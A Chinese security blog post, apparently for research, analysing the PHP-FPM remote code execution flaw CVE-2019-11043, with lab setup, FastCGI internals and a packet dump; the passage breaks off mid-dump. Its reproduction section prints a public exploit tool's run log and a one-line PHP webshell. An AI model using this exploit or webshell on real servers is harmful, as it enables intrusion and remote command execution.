@@ -1,0 +1,1969 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="wywwzjj">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="wywwzjj">
+    
+    <meta name="keywords" content="wywwzjj,wywwzjj blog,wywwzjj ctf,wywwzjj web security">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>PHP-FPM RCE (CVE-2019-11043) · wywwzjj&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/B.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">wywwzjj&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">PHP-FPM RCE (CVE-2019-11043)</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">wywwzjj's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            PHP-FPM RCE (CVE-2019-11043)
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="漏洞分析">漏洞分析</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="PHP">PHP</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">5.7k</span>阅读时长: <span class="post-count reading-time">28 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/01/23</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 <code>%0a</code> 符号时，服务返回异常，疑似存在漏洞。当 Nginx 将包含 PATH_INFO 为空的参数通过 FastCGI 传递给 PHP-FPM 时，PHP-FPM 接收处理的过程中存在逻辑问题。通过精心构造恶意请求可以对 PHP-FPM 进行内存污染，进一步可以复写内存并修改 PHP-FPM 配置，实现远程代码执行。</p>
+<p>官方补丁：<a href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227" target="_blank" rel="noopener">https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227</a></p>
+<p><strong>影响版本</strong></p>
+<p>PHP 7.1 版本小于 7.1.33</p>
+<p>PHP 7.2 版本小于 7.2.24</p>
+<p>PHP 7.3 版本小于 7.3.11</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>只想复现的直接用 p 师傅的 vulhub 启一下 docker，也可以 docker 里装 gdb 调。</p>
+<p>文档链接：<a href="https://vulhub.org/#/environments/php/CVE-2019-11043/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2019-11043/</a></p>
+<h3 id="编译-PHP"><a href="#编译-PHP" class="headerlink" title="编译 PHP"></a>编译 PHP</h3><p>非必要扩展就不装了。make 之后，二进制文件在 sapi/fpm 下面。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.php.net/distributions/php-7.2.23.tar.gz</span><br><span class="line">tar -xvf php-7.2.23.tar.gz &amp;&amp; cd php-7.2.23</span><br><span class="line">./configure --enable-debug --enable-fpm</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置-fpm"><a href="#配置-fpm" class="headerlink" title="配置 fpm"></a>配置 fpm</h3><p>进程管理方式 pm 选 static，并且 worker 进程设为 1，只产生一个进程便于追踪。日志就直接输出到屏幕。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">error_log</span> = /proc/self/fd/<span class="number">2</span></span><br><span class="line"><span class="attr">daemonize</span> = <span class="literal">no</span></span><br><span class="line"><span class="section">[www]</span></span><br><span class="line"><span class="attr">access.log</span> = /proc/self/fd/<span class="number">2</span></span><br><span class="line"><span class="attr">clear_env</span> = <span class="literal">no</span></span><br><span class="line"><span class="attr">listen</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span></span><br><span class="line"><span class="attr">pm</span> = static</span><br><span class="line"><span class="attr">pm.max_children</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">pm.start_servers</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="配置-nginx"><a href="#配置-nginx" class="headerlink" title="配置 nginx"></a>配置 nginx</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">      <span class="attribute">listen</span>     <span class="number">80</span> default_server;</span><br><span class="line">      <span class="attribute">server_name</span>  _;</span><br><span class="line">      <span class="attribute">root</span> /var/www/html;</span><br><span class="line"></span><br><span class="line">      <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">index</span>  index.php index.html index.htm;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> PATH_INFO       <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> PATH_TRANSLATED <span class="variable">$document_root</span><span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">        <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">      <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">      	<span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动-fpm"><a href="#启动-fpm" class="headerlink" title="启动 fpm"></a>启动 fpm</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./php-fpm -c php.ini -y php-fpm.conf</span><br></pre></td></tr></table></figure>
+
+<h3 id="CLion-调试"><a href="#CLion-调试" class="headerlink" title="CLion 调试"></a>CLion 调试</h3><p>我这里用 CLion attach 调试了，<a href="https://www.jetbrains.com/help/clion/attaching-to-local-process.html" target="_blank" rel="noopener">配置教程</a>。Run =&gt; Attach to process。</p>
+<p>如果出现 ptrace: Operation not permitted</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure>
+
+<p>或者直接 gdb（虽然 CLion 也是用的 gdb）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep "pool www" | awk 'NR==1&#123;print $2&#125;' | gdb -p</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>使用 <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a> 中给出的工具，发送数据包。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜ fpm-rce go run . http://localhost/index.php</span><br><span class="line">2020/01/23 03:04:17 Base status code is 200</span><br><span class="line">2020/01/23 03:04:18 Status code 404 for qsl=1850, adding as a candidate</span><br><span class="line">2020/01/23 03:04:18 The target is probably vulnerable. Possible QSLs: [1840 1845 1850]</span><br><span class="line">2020/01/23 03:04:18 Attack params found: --qsl 1845 --pisos 43 --skip-detect</span><br><span class="line">2020/01/23 03:04:18 Trying to set "session.auto_start=0"...</span><br><span class="line">2020/01/23 03:04:18 Detect() returned attack params: --qsl 1845 --pisos 43 --skip-detect &lt;-- REMEMBER THIS</span><br><span class="line">2020/01/23 03:04:18 Performing attack using php.ini settings...</span><br><span class="line">2020/01/23 03:04:18 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&amp;" to URLs</span><br><span class="line">2020/01/23 03:04:18 Trying to cleanup /tmp/a...</span><br><span class="line">2020/01/23 03:04:18 Done!</span><br><span class="line"></span><br><span class="line">➜ fpm-rce cat /tmp/a</span><br><span class="line">&lt;?php echo `$_GET[a]`;return;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="FPM-生命周期"><a href="#FPM-生命周期" class="headerlink" title="FPM 生命周期"></a>FPM 生命周期</h2><p>这一部分建议看<a href="https://github.com/pangudashu/php7-internal/blob/master/1/fpm.md" target="_blank" rel="noopener">盘谷大叔的书</a>，以下是部分摘录。</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbjmb4q379j20he0d2wj1.jpg" alt="image.png"></p>
+<p><code>fpm_run()</code> 执行后将 fork 出 worker 进程，worker 进程返回 <code>main()</code> 中继续向下执行，后面的流程就是 worker 进程不断 accept 请求，然后执行 PHP 脚本并返回。整体流程如下：</p>
+<ul>
+<li><strong>(1) 等待请求：</strong> worker 进程阻塞在 <code>fcgi_accept_request()</code> 等待请求；</li>
+<li><strong>(2) 解析请求：</strong> fastcgi 请求到达后被 worker 接收，然后开始接收并解析请求数据，直到 request 数据完全到达；</li>
+<li><strong>(3) 请求初始化：</strong> 执行 <code>php_request_startup()</code>，此阶段会调用每个扩展的：<code>PHP_RINIT_FUNCTION()</code>；</li>
+<li><strong>(4) 编译、执行：</strong> 由 <code>php_execute_script()</code> 完成 PHP 脚本的编译、执行；</li>
+<li><strong>(5) 关闭请求：</strong> 请求完成后执行 <code>php_request_shutdown()</code>，此阶段会调用每个扩展的：<code>PHP_RSHUTDOWN_FUNCTION()</code>，然后进入步骤 (1) 等待下一个请求。</li>
+</ul>
+<p>worker 进程一次请求的处理被划分为 5 个阶段：</p>
+<ul>
+<li><strong>FPM_REQUEST_ACCEPTING:</strong> 等待请求阶段</li>
+<li><strong>FPM_REQUEST_READING_HEADERS:</strong> 读取 fastcgi 请求 header 阶段</li>
+<li><strong>FPM_REQUEST_INFO:</strong> 获取请求信息阶段，此阶段是将请求的 method、query stirng、request uri 等信息保存到各 worker 进程的 fpm_scoreboard_proc_s 结构中，此操作需要加锁，因为 master 进程也会操作此结构</li>
+<li><strong>FPM_REQUEST_EXECUTING:</strong> 执行请求阶段</li>
+<li><strong>FPM_REQUEST_END:</strong> 没有使用</li>
+<li><strong>FPM_REQUEST_FINISHED:</strong> 请求处理完成</li>
+</ul>
+<p>worker 处理到各个阶段时将会把当前阶段更新到 <code>fpm_scoreboard_proc_s-&gt;request_stage</code>，master 进程正是通过这个标识判断 worker 进程是否空闲的。FPM 进程管理有个记分牌机制。</p>
+<h2 id="FastCGI-协议"><a href="#FastCGI-协议" class="headerlink" title="FastCGI 协议"></a>FastCGI 协议</h2><p>文档：<a href="http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html" target="_blank" rel="noopener">http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbo2q5joroj21av0f7gpv.jpg" alt="image.png"></p>
+<p><code>len = (contentLengthB1 &lt;&lt; 8) | contentLengthB0</code> 说明一次性最多发 2 ^ 16 = 256k。</p>
+<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_header</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> version;			<span class="comment">// 版本</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> type;				<span class="comment">// 本次 record 的类型</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB1;		<span class="comment">// 本次 record 对应的请求 id</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB0;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB1;	<span class="comment">// body 的大小</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB0;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> paddingLength;	<span class="comment">// 额外块大小</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> reserved;</span><br><span class="line">&#125; fcgi_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> _fcgi_request_type &#123;</span><br><span class="line">	FCGI_BEGIN_REQUEST		=  <span class="number">1</span>, <span class="comment">/* [in]                              */</span></span><br><span class="line">	FCGI_ABORT_REQUEST		=  <span class="number">2</span>, <span class="comment">/* [in]  (not supported)             */</span></span><br><span class="line">	FCGI_END_REQUEST		=  <span class="number">3</span>, <span class="comment">/* [out]                             */</span></span><br><span class="line">	FCGI_PARAMS				=  <span class="number">4</span>, <span class="comment">/* [in]  environment variables       */</span></span><br><span class="line">	FCGI_STDIN				=  <span class="number">5</span>, <span class="comment">/* [in]  post data                   */</span></span><br><span class="line">	FCGI_STDOUT				=  <span class="number">6</span>, <span class="comment">/* [out] response                    */</span></span><br><span class="line">	FCGI_STDERR				=  <span class="number">7</span>, <span class="comment">/* [out] errors                      */</span></span><br><span class="line">	FCGI_DATA				=  <span class="number">8</span>, <span class="comment">/* [in]  filter data (not supported) */</span></span><br><span class="line">	FCGI_GET_VALUES			=  <span class="number">9</span>, <span class="comment">/* [in]                              */</span></span><br><span class="line">	FCGI_GET_VALUES_RESULT	= <span class="number">10</span>  <span class="comment">/* [out]                             */</span></span><br><span class="line">&#125; fcgi_request_type;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbk8k4lkzjj20e80exdl6.jpg" alt="image.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbk8b6xunej20o90cidk2.jpg" alt="image.png"></p>
+<h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbi62e4czfj20jl09a789.jpg" alt="image.png"></p>
+<p>以下是向服务器发送 <code>index.php/abc%0aabc</code> 时抓的数据包，结合上面几张图就很容易看懂了。</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   ........ ........</span><br><span class="line"><span class="symbol">00000010 </span> <span class="number">01</span> <span class="number">04</span> <span class="number">00</span> <span class="number">01</span> <span class="number">02</span> <span class="number">48</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>c <span class="number">00</span> <span class="number">51</span> <span class="number">55</span> <span class="number">45</span> <span class="number">52</span> <span class="number">59</span> <span class="number">5</span>f   .....H.. ..QUERY_</span><br><span class="line"><span class="symbol">00000020 </span> <span class="number">53</span> <span class="number">54</span> <span class="number">52</span> <span class="number">49</span> <span class="number">4e</span> <span class="number">47</span> <span class="number">0e</span> <span class="number">03</span>  <span class="number">52</span> <span class="number">45</span> <span class="number">51</span> <span class="number">55</span> <span class="number">45</span> <span class="number">53</span> <span class="number">54</span> <span class="number">5</span>f   STRING.. REQUEST_</span><br><span class="line"><span class="symbol">00000030 </span> <span class="number">4d</span> <span class="number">45</span> <span class="number">54</span> <span class="number">48</span> <span class="number">4</span>f <span class="number">44</span> <span class="number">47</span> <span class="number">45</span>  <span class="number">54</span> <span class="number">0</span>c <span class="number">00</span> <span class="number">43</span> <span class="number">4</span>f <span class="number">4e</span> <span class="number">54</span> <span class="number">45</span>   METHODGE T..CONTE</span><br><span class="line"><span class="symbol">00000040 </span> <span class="number">4e</span> <span class="number">54</span> <span class="number">5</span>f <span class="number">54</span> <span class="number">59</span> <span class="number">50</span> <span class="number">45</span> <span class="number">0e</span>  <span class="number">00</span> <span class="number">43</span> <span class="number">4</span>f <span class="number">4e</span> <span class="number">54</span> <span class="number">45</span> <span class="number">4e</span> <span class="number">54</span>   NT_TYPE. .CONTENT</span><br><span class="line"><span class="symbol">00000050 </span> <span class="number">5</span>f <span class="number">4</span>c <span 